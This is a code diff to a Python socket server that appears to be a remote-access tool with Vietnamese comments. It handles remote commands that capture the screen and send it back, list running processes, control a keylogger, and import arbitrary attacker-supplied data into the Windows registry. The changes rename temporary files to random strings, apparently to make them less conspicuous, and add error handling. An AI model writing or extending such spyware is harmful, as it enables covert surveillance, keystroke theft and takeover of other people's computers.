@@ -57,7 +57,7 @@ class Server(object):
         self.connectButton.grid(column=1, row=1)
         self.root.mainloop()
         try:
-            s.shutdown(2) #Dong ket noi socket
+            self.conn.close()#Dong ket noi socket
         except:
             pass
     
@@ -79,8 +79,8 @@ class Server(object):
                 self.conn.send("Invalid command: " + str(e))
         elif Str.decode() == 'CAPSCR':
             try:
-                pyautogui.screenshot().save('scr.png')
-                send = open('scr.png','rb')
+                pyautogui.screenshot().save('bKneabBdp53zAl7zOF5t.png')
+                send = open('bKneabBdp53zAl7zOF5t.png','rb')
                 while True:
                     data=send.read(1024)
                     if not data:
@@ -91,8 +91,8 @@ class Server(object):
                 pass        
         elif Str.decode() == 'SHWPRC':
             #Commands the server to send the file consisting of running processes
-            os.system("wmic process get Name, ProcessId, ThreadCount >list.txt")
-            send = open('list.txt', 'r')
+            os.system("wmic process get Name, ProcessId, ThreadCount >VK6neXBFYwrwsDmbu8ja.txt")
+            send = open('VK6neXBFYwrwsDmbu8ja.txt', 'r')
             while True:
                 data = send.readline()
                 print(data)
@@ -182,15 +182,18 @@ class Server(object):
         elif Str.decode() == 'KEYSTOP':
             self.stopKeylogging()
         else:
-            f_bin=open(r'testing.reg','wb+')
-            f_bin.write(Str)
-            f_bin.close()
-            if len(Str)<1024:
-                try:
-                    registry.importRegistry(filepath=r'testing.reg')
-                    self.conn.send('Completed'.encode())
-                except:
-                    self.conn.send('Failed'.encode())
+            try:
+                f_bin=open(r'AOF0EcaC3IaVlnR9XMOw.reg','wb+')
+                f_bin.write(Str)
+                f_bin.close()
+                if len(Str)<1024:
+                    try:
+                        registry.importRegistry(filepath=r'AOF0EcaC3IaVlnR9XMOw.reg')
+                        self.conn.send('Completed'.encode())
+                    except:
+                        self.conn.send('Failed'.encode())
+            except:
+                print('Goodbye')
 
     #ATTRIBUTES AND METHODS SPECIFICALLY FOR KEYLOGGING:
     __interval = 5
